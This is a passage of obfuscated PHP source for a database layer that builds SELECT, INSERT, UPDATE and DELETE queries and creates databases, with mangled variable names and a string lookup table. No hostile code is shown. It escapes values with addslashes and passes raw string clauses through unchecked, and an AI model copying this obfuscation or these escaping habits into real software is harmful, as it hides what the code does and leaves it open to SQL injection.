$ù¹ÓëŠ  = explode($ ¢ÅºÍ[50], $ù¹ÓëŠ ); } if (is_array($ù¹ÓëŠ )) { $ŞŸ–÷ñø = array(); foreach ($ù¹ÓëŠ  as $³å¸†¶¥ => $ËÌÚ‡üâ) { if (!is_numeric($³å¸†¶¥)) { $ŞŸ–÷ñø[] = $this->parseKey($³å¸†¶¥, !1) . $ ¢ÅºÍ[1072] . $this->parseKey($ËÌÚ‡üâ); } else { $ŞŸ–÷ñø[] = $this->parseKey($ËÌÚ‡üâ); } } $·ÒÊà¤ = implode($ ¢ÅºÍ[50], $ŞŸ–÷ñø); } elseif (is_string($ù¹ÓëŠ ) && !empty($ù¹ÓëŠ )) { $·ÒÊà¤ = $ù¹ÓëŠ ; } else { $·ÒÊà¤ = $ ¢ÅºÍ[220]; } return $·ÒÊà¤; } protected function parseTable($œ«‚¯Œğ) { $ìë±­¢³ =& $_SERVER[Ş­ğŠìÒ]; if (is_array($œ«‚¯Œğ)) { $Õ¶½°çã = array(); foreach ($œ«‚¯Œğ as $ôÇ»‚“ => $Êò×šÓ“) { if (!is_numeric($ôÇ»‚“)) { $Õ¶½°çã[] = $this->parseKey($ôÇ»‚“) . $ìë±­¢³[53] . $this->parseKey($Êò×šÓ“); } else { $Õ¶½°çã[] = $this->parseKey($ôÇ»‚“); } } $œ«‚¯Œğ = $Õ¶½°çã; } elseif (is_string($œ«‚¯Œğ)) { if (strstr($œ«‚¯Œğ, $ìë±­¢³[53])) { return $œ«‚¯Œğ; } $œ«‚¯Œğ = explode($ìë±­¢³[50], $œ«‚¯Œğ); array_walk($œ«‚¯Œğ, array($this, $ìë±­¢³[980])); } return $ìë±­¢³[974] . trim(implode($ìë±­¢³[1073], $œ«‚¯Œğ), $ìë±­¢³[461]) . $ìë±­¢³[974]; } protected function parseWhere($ö‰„è©) { $ÖÍÒ¬ËÌ =& $_SERVER[Ş­ğŠìÒ]; $ıÍÆÂó© = $ÖÍÒ¬ËÌ[12]; if (is_string($ö‰„è©)) { $ıÍÆÂó© = $ö‰„è©; } else { $ò‚äšÖÎ = isset($ö‰„è©[$ÖÍÒ¬ËÌ[1074]]) ? strtoupper($ö‰„è©[$ÖÍÒ¬ËÌ[1074]]) : $ÖÍÒ¬ËÌ[12]; if (in_array($ò‚äšÖÎ, array($ÖÍÒ¬ËÌ[1075], $ÖÍÒ¬ËÌ[1076], $ÖÍÒ¬ËÌ[1077]))) { $ò‚äšÖÎ = $ÖÍÒ¬ËÌ[53] . $ò‚äšÖÎ . $ÖÍÒ¬ËÌ[53]; unset($ö‰„è©[$ÖÍÒ¬ËÌ[1074]]); } else { $ò‚äšÖÎ = $ÖÍÒ¬ËÌ[1078]; } foreach ($ö‰„è© as $òîÉÓ§õ => $İä’Ÿş²) { $ıÍÆÂó© .= $ÖÍÒ¬ËÌ[354]; if (is_numeric($òîÉÓ§õ)) { $òîÉÓ§õ = $ÖÍÒ¬ËÌ[1079]; } if (0 === strpos($òîÉÓ§õ, $ÖÍÒ¬ËÌ[11])) { $ıÍÆÂó© .= $this->parseThinkWhere($òîÉÓ§õ, $İä’Ÿş²); } else { if (!preg_match($ÖÍÒ¬ËÌ[1080], trim($òîÉÓ§õ))) { think_exception(think_lang($ÖÍÒ¬ËÌ[1081]) . $ÖÍÒ¬ËÌ[4] . $òîÉÓ§õ); } $â×š×ÙÚ = is_array($İä’Ÿş²) && isset($İä’Ÿş²[$ÖÍÒ¬ËÌ[1082]]); $òîÉÓ§õ = trim($òîÉÓ§õ); if (strpos($òîÉÓ§õ, $ÖÍÒ¬ËÌ[214])) { $æµ¼‘é = explode($ÖÍÒ¬ËÌ[214], $òîÉÓ§õ); $»Ğè–” = array(); foreach ($æµ¼‘é as $ñîø‹Ë“ => $ÇİÉÉ) { $Š˜±ÍŸ = $â×š×ÙÚ ? $İä’Ÿş²[$ñîø‹Ë“] : $İä’Ÿş²; $»Ğè–”[] = $ÖÍÒ¬ËÌ[337] . $this->parseWhereItem($this->parseKey($ÇİÉÉ), $Š˜±ÍŸ) . $ÖÍÒ¬ËÌ[979]; } $ıÍÆÂó© .= implode($ÖÍÒ¬ËÌ[1083], $»Ğè–”); } elseif (strpos($òîÉÓ§õ, $ÖÍÒ¬ËÌ[360])) { $æµ¼‘é = explode($ÖÍÒ¬ËÌ[360], $òîÉÓ§õ); $»Ğè–” = array(); foreach ($æµ¼‘é as $ñîø‹Ë“ => $ÇİÉÉ) { $Š˜±ÍŸ = $â×š×ÙÚ ? $İä’Ÿş²[$ñîø‹Ë“] : $İä’Ÿş²; $»Ğè–”[] = $ÖÍÒ¬ËÌ[337] . $this->parseWhereItem($this->parseKey($ÇİÉÉ), $Š˜±ÍŸ) . $ÖÍÒ¬ËÌ[979]; } $ıÍÆÂó© .= implode($ÖÍÒ¬ËÌ[1078], $»Ğè–”); } else { $ıÍÆÂó© .= $this->parseWhereItem($this->parseKey($òîÉÓ§õ), $İä’Ÿş²); } } $ıÍÆÂó© .= $ÖÍÒ¬ËÌ[355] . $ò‚äšÖÎ; } $ıÍÆÂó© = substr($ıÍÆÂó©, 0, -strlen($ò‚äšÖÎ)); } return empty($ıÍÆÂó©) ? $ÖÍÒ¬ËÌ[12] : $ÖÍÒ¬ËÌ[1084] . $ıÍÆÂó©; } protected function parseWhereItem($¼èäßÜ¸, $¿Àºê—ë) { $…›ŞÚ‚” =& $_SERVER[Ş­ğŠìÒ]; $Öñ‹î”Û = $…›ŞÚ‚”[12]; if (is_array($¿Àºê—ë)) { if (is_string($¿Àºê—ë[0])) { $¾¹‹Èíú = strtolower($¿Àºê—ë[0]); if (in_array($¿Àºê—ë[0], array($…›ŞÚ‚”[957], $…›ŞÚ‚”[1085], $…›ŞÚ‚”[1086], $…›ŞÚ‚”[1087], $…›ŞÚ‚”[1088], $…›ŞÚ‚”[1089]))) { $Öñ‹î”Û .= $¼èäßÜ¸ . $…›ŞÚ‚”[53] . $¿Àºê—ë[0] . $…›ŞÚ‚”[53] . $this->parseValue($¿Àºê—ë[1]); } elseif (preg_match($…›ŞÚ‚”[1090], $¿Àºê—ë[0])) { $Öñ‹î”Û .= $¼èäßÜ¸ . $…›ŞÚ‚”[53] . $this->exp[$¾¹‹Èíú] . $…›ŞÚ‚”[53] . $this->parseValue($¿Àºê—ë[1]); } elseif (preg_match($…›ŞÚ‚”[1091], $¿Àºê—ë[0])) { if (is_array($¿Àºê—ë[1])) { $¤À»Ëû÷ = isset($¿Àºê—ë[2]) ? strtoupper($¿Àºê—ë[2]) : $…›ŞÚ‚”[1076]; if (in_array($¤À»Ëû÷, array($…›ŞÚ‚”[1075], $…›ŞÚ‚”[1076], $…›ŞÚ‚”[1077]))) { $ªò€² = array(); foreach ($¿Àºê—ë[1] as $óÕ­ëêı) { $ªò€²[] = $¼èäßÜ¸ . $…›ŞÚ‚”[53] . $this->exp[$¾¹‹Èíú] . $…›ŞÚ‚”[53] . $this->parseValue($óÕ­ëêı); } $Öñ‹î”Û .= $…›ŞÚ‚”[337] . implode($…›ŞÚ‚”[53] . $¤À»Ëû÷ . $…›ŞÚ‚”[53], $ªò€²) . $…›ŞÚ‚”[979]; } } else { $Öñ‹î”Û .= $¼èäßÜ¸ . $…›ŞÚ‚”[53] . $this->exp[$¾¹‹Èíú] . $…›ŞÚ‚”[53] . $this->parseValue($¿Àºê—ë[1]); } } elseif ($…›ŞÚ‚”[373] == $¾¹‹Èíú) { $Öñ‹î”Û .= $…›ŞÚ‚”[977] . $¼èäßÜ¸ . $…›ŞÚ‚”[53] . $¿Àºê—ë[1] . $…›ŞÚ‚”[1092]; } elseif (preg_match($…›ŞÚ‚”[1093], $¿Àºê—ë[0])) { $Öñ‹î”Û .= $¿Àºê—ë[0]; } elseif (preg_match($…›ŞÚ‚”[1094], $¿Àºê—ë[0])) { if (isset($¿Àºê—ë[2]) && $…›ŞÚ‚”[373] == $¿Àºê—ë[2]) { $Öñ‹î”Û .= $¼èäßÜ¸ . $…›ŞÚ‚”[53] . $this->exp[$¾¹‹Èíú] . $…›ŞÚ‚”[53] . $¿Àºê—ë[1]; } else { if (is_string($¿Àºê—ë[1])) { $¿Àºê—ë[1] = explode($…›ŞÚ‚”[50], $¿Àºê—ë[1]); } $ÕèĞß®Ö = implode($…›ŞÚ‚”[50], $this->parseValue($¿Àºê—ë[1])); $Öñ‹î”Û .= $¼èäßÜ¸ . $…›ŞÚ‚”[53] . $this->exp[$¾¹‹Èíú] . $…›ŞÚ‚”[977] . $ÕèĞß®Ö . $…›ŞÚ‚”[979]; } } elseif (preg_match($…›ŞÚ‚”[1095], $¿Àºê—ë[0])) { $È¡§—ßÍ = is_string($¿Àºê—ë[1]) ? explode($…›ŞÚ‚”[50], $¿Àºê—ë[1]) : $¿Àºê—ë[1]; $Öñ‹î”Û .= $…›ŞÚ‚”[977] . $¼èäßÜ¸ . $…›ŞÚ‚”[53] . $this->exp[$¾¹‹Èíú] . $…›ŞÚ‚”[53] . $this->parseValue($È¡§—ßÍ[0]) . $…›ŞÚ‚”[1078] . $this->parseValue($È¡§—ßÍ[1]) . $…›ŞÚ‚”[355]; } else { think_exception(think_lang($…›ŞÚ‚”[1081]) . $…›ŞÚ‚”[4] . $¿Àºê—ë[0]); } } else { $İ²ñº‚ê = count($¿Àºê—ë); $¿¡ëò¬» = $…›ŞÚ‚”[12]; if (is_string($¿Àºê—ë[$İ²ñº‚ê - 1])) { $¿¡ëò¬» = isset($¿Àºê—ë[$İ²ñº‚ê - 1]) ? strtoupper($¿Àºê—ë[$İ²ñº‚ê - 1]) : $…›ŞÚ‚”[12]; if (in_array($¿¡ëò¬», array($…›ŞÚ‚”[1075], $…›ŞÚ‚”[1076], $…›ŞÚ‚”[1077]))) { $İ²ñº‚ê = $İ²ñº‚ê - 1; } } else { $¿¡ëò¬» = $…›ŞÚ‚”[1075]; } for ($£óÃÌÇ© = 0; $£óÃÌÇ© < $İ²ñº‚ê; $£óÃÌÇ©++) { $È¡§—ßÍ = is_array($¿Àºê—ë[$£óÃÌÇ©]) ? $¿Àºê—ë[$£óÃÌÇ©][1] : $¿Àºê—ë[$£óÃÌÇ©]; if ($…›ŞÚ‚”[373] == strtolower($¿Àºê—ë[$£óÃÌÇ©][0])) { $Öñ‹î”Û .= $…›ŞÚ‚”[337] . $¼èäßÜ¸ . $…›ŞÚ‚”[53] . $È¡§—ßÍ . $…›ŞÚ‚”[1092] . $¿¡ëò¬» . $…›ŞÚ‚”[53]; } else { $Û‚Ä£ê = is_array($¿Àºê—ë[$£óÃÌÇ©]) ? $this->exp[strtolower($¿Àºê—ë[$£óÃÌÇ©][0])] : $…›ŞÚ‚”[957]; if (!$Û‚Ä£ê && is_array($¿Àºê—ë[$£óÃÌÇ©]) && in_array($¿Àºê—ë[$£óÃÌÇ©][0], array($…›ŞÚ‚”[957], $…›ŞÚ‚”[1085], $…›ŞÚ‚”[1086], $…›ŞÚ‚”[1087], $…›ŞÚ‚”[1088], $…›ŞÚ‚”[1089]))) { $Û‚Ä£ê = $¿Àºê—ë[$£óÃÌÇ©][0]; } $Öñ‹î”Û .= $…›ŞÚ‚”[337] . $¼èäßÜ¸ . $…›ŞÚ‚”[53] . $Û‚Ä£ê . $…›ŞÚ‚”[53] . $this->parseValue($È¡§—ßÍ) . $…›ŞÚ‚”[1092] . $¿¡ëò¬» . $…›ŞÚ‚”[53]; } } $Öñ‹î”Û = substr($Öñ‹î”Û, 0, -4); } } else { $Öñ‹î”Û .= $¼èäßÜ¸ . $…›ŞÚ‚”[1096] . $this->parseValue($¿Àºê—ë); } return $Öñ‹î”Û; } protected function parseThinkWhere($Ş™Õú•ä, $†ÁÆÌÌ) { $Ì¯ú‹¦ =& $_SERVER[Ş­ğŠìÒ]; $¢í¢Ì¤Ê = $Ì¯ú‹¦[12]; switch ($Ş™Õú•ä) { case $Ì¯ú‹¦[428]: $¢í¢Ì¤Ê = $†ÁÆÌÌ; break; case $Ì¯ú‹¦[1079]: $¢í¢Ì¤Ê = is_string($†ÁÆÌÌ) ? $†ÁÆÌÌ : substr($this->parseWhere($†ÁÆÌÌ), 6); break; case $Ì¯ú‹¦[1097]: parse_str($†ÁÆÌÌ, $¸ÆÏÈÀŸ); if (isset($¸ÆÏÈÀŸ[$Ì¯ú‹¦[1074]])) { $©Í˜Ÿ¹™ = $Ì¯ú‹¦[53] . strtoupper($¸ÆÏÈÀŸ[$Ì¯ú‹¦[1074]]) . $Ì¯ú‹¦[53]; unset($¸ÆÏÈÀŸ[$Ì¯ú‹¦[1074]]); } else { $©Í˜Ÿ¹™ = $Ì¯ú‹¦[1078]; } $ªÄ×ÚØÙ = array(); foreach ($¸ÆÏÈÀŸ as $¨šı£Í => $­„ŞÏı ) { $ªÄ×ÚØÙ[] = $this->parseKey($¨šı£Í) . $Ì¯ú‹¦[1096] . $this->parseValue($­„ŞÏı ); } $¢í¢Ì¤Ê = implode($©Í˜Ÿ¹™, $ªÄ×ÚØÙ); break; } return $¢í¢Ì¤Ê; } protected function parseLimit($Ôß¸Ã›ô) { $ÎÚ‹ÛØ =& $_SERVER[Ş­ğŠìÒ]; return !empty($Ôß¸Ã›ô) ? $ÎÚ‹ÛØ[51] . $Ôß¸Ã›ô . $ÎÚ‹ÛØ[53] : $ÎÚ‹ÛØ[12]; } protected function parseJoin($†§îÍ–Ã) { $×°ìæ´Ø =& $_SERVER[Ş­ğŠìÒ]; $£Üï«Ì² = $×°ìæ´Ø[12]; if (!empty($†§îÍ–Ã)) { if (is_array($†§îÍ–Ã)) { foreach ($†§îÍ–Ã as $àøë»å => $Ô™·áó¤) { if (!1 !== stripos($Ô™·áó¤, $×°ìæ´Ø[1098])) { $£Üï«Ì² .= $×°ìæ´Ø[53] . $Ô™·áó¤; } else { $£Üï«Ì² .= $×°ìæ´Ø[1099] . $Ô™·áó¤; } } } else { $£Üï«Ì² .= $×°ìæ´Ø[1099] . $†§îÍ–Ã; } } $£Üï«Ì² = preg_replace($×°ìæ´Ø[1100], think_config($×°ìæ´Ø[1004]) . $×°ìæ´Ø[1101], $£Üï«Ì²); return $£Üï«Ì²; } protected function parseOrder($º´è…×è) { $—±ØˆøØ =& $_SERVER[Ş­ğŠìÒ]; if (is_array($º´è…×è)) { $±Àñ§óÁ = array(); foreach ($º´è…×è as $ß’›ÉŒ => $É×Û…”¯) { if (is_numeric($ß’›ÉŒ)) { $±Àñ§óÁ[] = $this->parseKey($É×Û…”¯); } else { $É×Û…”¯ = in_array(strtoupper(trim($É×Û…”¯)), array($—±ØˆøØ[1102], $—±ØˆøØ[1103])) ? $—±ØˆøØ[53] . $É×Û…”¯ : $—±ØˆøØ[12]; if (preg_match($—±ØˆøØ[1104], $ß’›ÉŒ)) { $±Àñ§óÁ[] = $this->parseKey($ß’›ÉŒ) . $É×Û…”¯; } else { think_exception($—±ØˆøØ[1105] . $ß’›ÉŒ); } } } $º´è…×è = implode($—±ØˆøØ[50], $±Àñ§óÁ); } return !empty($º´è…×è) ? $—±ØˆøØ[1106] . $º´è…×è : $—±ØˆøØ[12]; } protected function parseGroup($é‚İ†¸ˆ) { $À¢³ÓÈ =& $_SERVER[Ş­ğŠìÒ]; return !empty($é‚İ†¸ˆ) ? $À¢³ÓÈ[1107] . $é‚İ†¸ˆ : $À¢³ÓÈ[12]; } protected function parseHaving($®ìø´Ü) { $Øªû‰î =& $_SERVER[Ş­ğŠìÒ]; return !empty($®ìø´Ü) ? $Øªû‰î[1108] . $®ìø´Ü : $Øªû‰î[12]; } protected function parseComment($±Õ¡ˆ‡) { $©¦‘î =& $_SERVER[Ş­ğŠìÒ]; return !empty($±Õ¡ˆ‡) ? $©¦‘î[1109] . $±Õ¡ˆ‡ . $©¦‘î[1110] : $©¦‘î[12]; } protected function parseDistinct($°Öª²ó£) { $´š¡›„ =& $_SERVER[Ş­ğŠìÒ]; return !empty($°Öª²ó£) ? $´š¡›„[1111] : $´š¡›„[12]; } protected function parseUnion($¤ó²ë˜¯) { $õóÃÄœ =& $_SERVER[Ş­ğŠìÒ]; if (empty($¤ó²ë˜¯)) { return $õóÃÄœ[12]; } if (isset($¤ó²ë˜¯[$õóÃÄœ[424]])) { $¹ãËÓàÖ = $õóÃÄœ[1112]; unset($¤ó²ë˜¯[$õóÃÄœ[424]]); } else { $¹ãËÓàÖ = $õóÃÄœ[1113]; } foreach ($¤ó²ë˜¯ as $Œ÷í¦ª) { $îâö¶Ï[] = $¹ãËÓàÖ . (is_array($Œ÷í¦ª) ? $this->buildSelectSql($Œ÷í¦ª) : $Œ÷í¦ª); } return implode($õóÃÄœ[53], $îâö¶Ï); } public function insert($¨Ôôîµ, $ˆÅÕÒÌ¾ = array(), $áÑŸ±¡ = false) { $àß¯ú²Î =& $_SERVER[Ş­ğŠìÒ]; $¹æÉöõô = $´Âº·• = array(); $this->model = $ˆÅÕÒÌ¾[$àß¯ú²Î[358]]; foreach ($¨Ôôîµ as $úëèÅŸ => $İÀ¨Ğ˜) { if (is_array($İÀ¨Ğ˜) && $àß¯ú²Î[373] == $İÀ¨Ğ˜[0]) { $´Âº·•[] = $this->parseKey($úëèÅŸ); $¹æÉöõô[] = $İÀ¨Ğ˜[1]; } elseif (is_scalar($İÀ¨Ğ˜) || is_null($İÀ¨Ğ˜)) { $´Âº·•[] = $this->parseKey($úëèÅŸ); $¹æÉöõô[] = $this->parseValue($İÀ¨Ğ˜); } } $šúÆœ—Ÿ = ($áÑŸ±¡ ? $àß¯ú²Î[981] : $àß¯ú²Î[982]) . $àß¯ú²Î[983] . $this->parseTable($ˆÅÕÒÌ¾[$àß¯ú²Î[356]]) . $àß¯ú²Î[977] . implode($àß¯ú²Î[50], $´Âº·•) . $àß¯ú²Î[978] . implode($àß¯ú²Î[50], $¹æÉöõô) . $àß¯ú²Î[979]; $šúÆœ—Ÿ .= $this->parseLock(isset($ˆÅÕÒÌ¾[$àß¯ú²Î[910]]) ? $ˆÅÕÒÌ¾[$àß¯ú²Î[910]] : !1); $šúÆœ—Ÿ .= $this->parseComment(!empty($ˆÅÕÒÌ¾[$àß¯ú²Î[430]]) ? $ˆÅÕÒÌ¾[$àß¯ú²Î[430]] : $àß¯ú²Î[12]); return $this->execute($šúÆœ—Ÿ, $this->parseBind(!empty($ˆÅÕÒÌ¾[$àß¯ú²Î[361]]) ? $ˆÅÕÒÌ¾[$àß¯ú²Î[361]] : array())); } public function selectInsert($‡Êßùı, $½‰¥ÊÔ½, $Ø—Ï¤Úû = array()) { $Â‹èˆÆ =& $_SERVER[Ş­ğŠìÒ]; $this->model = $Ø—Ï¤Úû[$Â‹èˆÆ[358]]; if (is_string($‡Êßùı)) { $‡Êßùı = explode($Â‹èˆÆ[50], $‡Êßùı); } array_walk($‡Êßùı, array($this, $Â‹èˆÆ[980])); $ñöç– Ó = $Â‹èˆÆ[1114] . $this->parseTable($½‰¥ÊÔ½) . $Â‹èˆÆ[977] . implode($Â‹èˆÆ[50], $‡Êßùı) . $Â‹èˆÆ[1092]; $ñöç– Ó .= $this->buildSelectSql($Ø—Ï¤Úû); return $this->execute($ñöç– Ó, $this->parseBind(!empty($Ø—Ï¤Úû[$Â‹èˆÆ[361]]) ? $Ø—Ï¤Úû[$Â‹èˆÆ[361]] : array())); } public function update($á°ÁÃ†”, $¨¦Á²§Ğ) { $½–æıª‚ =& $_SERVER[Ş­ğŠìÒ]; $this->model = $¨¦Á²§Ğ[$½–æıª‚[358]]; $Ûº½çäİ = $½–æıª‚[1115] . $this->parseTable($¨¦Á²§Ğ[$½–æıª‚[356]]) . $this->parseSet($á°ÁÃ†”) . $this->parseWhere(!empty($¨¦Á²§Ğ[$½–æıª‚[352]]) ? $¨¦Á²§Ğ[$½–æıª‚[352]] : $½–æıª‚[12]) . $this->parseOrder(!empty($¨¦Á²§Ğ[$½–æıª‚[441]]) ? $¨¦Á²§Ğ[$½–æıª‚[441]] : $½–æıª‚[12]) . $this->parseLimit(!empty($¨¦Á²§Ğ[$½–æıª‚[368]]) ? $¨¦Á²§Ğ[$½–æıª‚[368]] : $½–æıª‚[12]) . $this->parseLock(isset($¨¦Á²§Ğ[$½–æıª‚[910]]) ? $¨¦Á²§Ğ[$½–æıª‚[910]] : !1) . $this->parseComment(!empty($¨¦Á²§Ğ[$½–æıª‚[430]]) ? $¨¦Á²§Ğ[$½–æıª‚[430]] : $½–æıª‚[12]); return $this->execute($Ûº½çäİ, $this->parseBind(!empty($¨¦Á²§Ğ[$½–æıª‚[361]]) ? $¨¦Á²§Ğ[$½–æıª‚[361]] : array())); } public function delete($ÑşøöÆ = array()) { $°øÛ¯—Ë =& $_SERVER[Ş­ğŠìÒ]; $this->model = $ÑşøöÆ[$°øÛ¯—Ë[358]]; $°ÕŒÃ¢ = $°øÛ¯—Ë[1116] . $this->parseTable($ÑşøöÆ[$°øÛ¯—Ë[356]]) . $this->parseWhere(!empty($ÑşøöÆ[$°øÛ¯—Ë[352]]) ? $ÑşøöÆ[$°øÛ¯—Ë[352]] : $°øÛ¯—Ë[12]) . $this->parseOrder(!empty($ÑşøöÆ[$°øÛ¯—Ë[441]]) ? $ÑşøöÆ[$°øÛ¯—Ë[441]] : $°øÛ¯—Ë[12]) . $this->parseLimit(!empty($ÑşøöÆ[$°øÛ¯—Ë[368]]) ? $ÑşøöÆ[$°øÛ¯—Ë[368]] : $°øÛ¯—Ë[12]) . $this->parseLock(isset($ÑşøöÆ[$°øÛ¯—Ë[910]]) ? $ÑşøöÆ[$°øÛ¯—Ë[910]] : !1) . $this->parseComment(!empty($ÑşøöÆ[$°øÛ¯—Ë[430]]) ? $ÑşøöÆ[$°øÛ¯—Ë[430]] : $°øÛ¯—Ë[12]); return $this->execute($°ÕŒÃ¢, $this->parseBind(!empty($ÑşøöÆ[$°øÛ¯—Ë[361]]) ? $ÑşøöÆ[$°øÛ¯—Ë[361]] : array())); } public function select($ÍøË©÷Ã = array()) { $õè„´°õ =& $_SERVER[Ş­ğŠìÒ]; $this->model = $ÍøË©÷Ã[$õè„´°õ[358]]; $×ÖåÆÚ = $this->buildSelectSql($ÍøË©÷Ã); $ò”°¼Õ” = isset($ÍøË©÷Ã[$õè„´°õ[425]]) ? $ÍøË©÷Ã[$õè„´°õ[425]] : !1; if ($ò”°¼Õ”) { $¹Ç©ôÆ¹ = is_string($ò”°¼Õ”[$õè„´°õ[97]]) ? $ò”°¼Õ”[$õè„´°õ[97]] : $õè„´°õ[1117] . md5($×ÖåÆÚ); $É¼Æ™·© = think_cache($¹Ç©ôÆ¹, $õè„´°õ[12], $ò”°¼Õ”); if (!1 !== $É¼Æ™·©) { return $É¼Æ™·©; } } $ĞÀ‚Ğ–ø = $this->query($×ÖåÆÚ, $this->parseBind(!empty($ÍøË©÷Ã[$õè„´°õ[361]]) ? $ÍøË©÷Ã[$õè„´°õ[361]] : array())); if ($ò”°¼Õ” && !1 !== $ĞÀ‚Ğ–ø) { think_cache($¹Ç©ôÆ¹, $ĞÀ‚Ğ–ø, $ò”°¼Õ”); } return $ĞÀ‚Ğ–ø; } public function buildSelectSql($íñ«¶µö = array()) { $¶ù“é”é =& $_SERVER[Ş­ğŠìÒ]; if (isset($íñ«¶µö[$¶ù“é”é[429]])) { if (strpos($íñ«¶µö[$¶ù“é”é[429]], $¶ù“é”é[50])) { list($ÕŸƒ¤ , $Êä­£) = explode($¶ù“é”é[50], $íñ«¶µö[$¶ù“é”é[429]]); } else { $ÕŸƒ¤  = $íñ«¶µö[$¶ù“é”é[429]]; } $ÕŸƒ¤  = $ÕŸƒ¤  ? $ÕŸƒ¤  : 1; $Êä­£ = isset($Êä­£) ? $Êä­£ : (is_numeric($íñ«¶µö[$¶ù“é”é[368]]) ? $íñ«¶µö[$¶ù“é”é[368]] : 20); $­½Å¦áÄ = $Êä­£ * ((int) $ÕŸƒ¤  - 1); $íñ«¶µö[$¶ù“é”é[368]] = $­½Å¦áÄ . $¶ù“é”é[50] . $Êä­£; } if (think_config($¶ù“é”é[1118])) { $ ²»÷Ç = $¶ù“é”é[1119] . md5(serialize($íñ«¶µö)); $±šÖ = think_cache($ ²»÷Ç); if ($±šÖ) { return $±šÖ; } } $”êÃ§‚˜ = $this->parseSql($this->selectSql, $íñ«¶µö); $”êÃ§‚˜ .= $this->parseLock(isset($íñ«¶µö[$¶ù“é”é[910]]) ? $íñ«¶µö[$¶ù“é”é[910]] : !1); if (isset($ ²»÷Ç)) { think_cache($ ²»÷Ç, $”êÃ§‚˜); } return $”êÃ§‚˜; } public function parseSql($ËíÜŒÎğ, $¢©ÑƒŞƒ = array()) { $ÇäÊˆ³ =& $_SERVER[Ş­ğŠìÒ]; $ËíÜŒÎğ = str_replace(array($ÇäÊˆ³[1120], $ÇäÊˆ³[1121], $ÇäÊˆ³[1122], $ÇäÊˆ³[1123], $ÇäÊˆ³[1124], $ÇäÊˆ³[1125], $ÇäÊˆ³[1126], $ÇäÊˆ³[1127], $ÇäÊˆ³[1128], $ÇäÊˆ³[1129], $ÇäÊˆ³[1130]), array($this->parseTable("{$¢©ÑƒŞƒ[$ÇäÊˆ³[356]]}"), $this->parseDistinct(isset($¢©ÑƒŞƒ[$ÇäÊˆ³[1131]]) ? $¢©ÑƒŞƒ[$ÇäÊˆ³[1131]] : !1), $this->parseField(!empty($¢©ÑƒŞƒ[$ÇäÊˆ³[350]]) ? $¢©ÑƒŞƒ[$ÇäÊˆ³[350]] : $ÇäÊˆ³[220]), $this->parseJoin(!empty($¢©ÑƒŞƒ[$ÇäÊˆ³[359]]) ? $¢©ÑƒŞƒ[$ÇäÊˆ³[359]] : $ÇäÊˆ³[12]), $this->parseWhere(!empty($¢©ÑƒŞƒ[$ÇäÊˆ³[352]]) ? $¢©ÑƒŞƒ[$ÇäÊˆ³[352]] : $ÇäÊˆ³[12]), $this->parseGroup(!empty($¢©ÑƒŞƒ[$ÇäÊˆ³[578]]) ? $¢©ÑƒŞƒ[$ÇäÊˆ³[578]] : $ÇäÊˆ³[12]), $this->parseHaving(!empty($¢©ÑƒŞƒ[$ÇäÊˆ³[1132]]) ? $¢©ÑƒŞƒ[$ÇäÊˆ³[1132]] : $ÇäÊˆ³[12]), $this->parseOrder(!empty($¢©ÑƒŞƒ[$ÇäÊˆ³[441]]) ? $¢©ÑƒŞƒ[$ÇäÊˆ³[441]] : $ÇäÊˆ³[12]), $this->parseLimit(!empty($¢©ÑƒŞƒ[$ÇäÊˆ³[368]]) ? $¢©ÑƒŞƒ[$ÇäÊˆ³[368]] : $ÇäÊˆ³[12]), $this->parseUnion(!empty($¢©ÑƒŞƒ[$ÇäÊˆ³[423]]) ? $¢©ÑƒŞƒ[$ÇäÊˆ³[423]] : $ÇäÊˆ³[12]), $this->parseComment(!empty($¢©ÑƒŞƒ[$ÇäÊˆ³[430]]) ? $¢©ÑƒŞƒ[$ÇäÊˆ³[430]] : $ÇäÊˆ³[12])), $ËíÜŒÎğ); return $ËíÜŒÎğ; } public function getLastSql($ğË¸œ®÷ = '') { return $ğË¸œ®÷ ? $this->modelSql[$ğË¸œ®÷] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($ù’ç¯‹) { return addslashes($ù’ç¯‹); } public function setModel($ë‰¾ø¿ğ) { $this->model = $ë‰¾ø¿ğ; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } class DbManage { function __construct($éİ²Ÿê = array()) { $Æ§òÔ°™ =& $_SERVER[Ş­ğŠìÒ]; if (empty($éİ²Ÿê)) { $éİ²Ÿê = $GLOBALS[$Æ§òÔ°™[6]][$Æ§òÔ°™[21]]; } $this->database = $éİ²Ÿê; } public function model($“‰…é€€ = '') { return new ModelBase($“‰…é€€, $_SERVER[Ş­ğŠìÒ][12], $this->database); } public function db($›í—·›ä = false) { $ªæŞÜ£› =& $_SERVER[Ş­ğŠìÒ]; $×’ÙÛ = array_change_key_case($this->database); if ($this->dbType() == $ªæŞÜ£›[13] || !$›í—·›ä) { return $this->model()->db(); } $Üä³¹•Î = $×’ÙÛ[$ªæŞÜ£›[1046]]; $×’ÙÛ[$ªæŞÜ£›[1046]] = $ªæŞÜ£›[12]; if ($×’ÙÛ[$ªæŞÜ£›[1041]] == $ªæŞÜ£›[1038]) { $’¹ì·æ = $×’ÙÛ[$ªæŞÜ£›[1047]]; $×’ÙÛ[$ªæŞÜ£›[1047]] = substr($’¹ì·æ, 0, strrpos($’¹ì·æ, $ªæŞÜ£›[1133])); } $this->database = $×’ÙÛ; $ßòœ®‚ò = $this->model()->db(); try { $–ï´’Î× = $ßòœ®‚ò->execute("\163\x68\x6f\167\40\x64\141\164\x61\142\x61\x73\x65\163\x20\154\151\x6b\145\40\47{$Üä³¹•Î}\47"); } catch (Exception $¹ê†É™¨) { } if (!$–ï´’Î×) { $ßòœ®‚ò->execute("\143\x72\145\141\x74\x65\40\144\141\x74\141\x62\141\163\145\x20\x60{$Üä³¹•Î}\x60"); } $×’ÙÛ[$ªæŞÜ£›[1046]] = $Üä³¹•Î; if ($×’ÙÛ[$ªæŞÜ£›[1041]] == $ªæŞÜ£›[1038]) { $×’ÙÛ[$ªæŞÜ£›[1047]] .= $ªæŞÜ£›[1133] . $Üä³¹•Î; } $this->database = $×’ÙÛ; $ßòœ®‚ò->execute("\165\163\145\x20\x60{$Üä³¹•Î}\x60"); return $ßòœ®‚ò; } public function createTable($°¹‰œÏ, &$ñ®ÎŞÎ¸) { $’Ó÷ÒÖ =& $_SERVER[Ş­ğŠìÒ]; if (!IO::exist($°¹‰œÏ)) { ActionCall($’Ó÷ÒÖ[1134], !0, 0); show_json(LNG($’Ó÷ÒÖ[1135]), !1); } $©¢¿¤‹ = $this->model()->db(); $è¬¢“Ùâ = 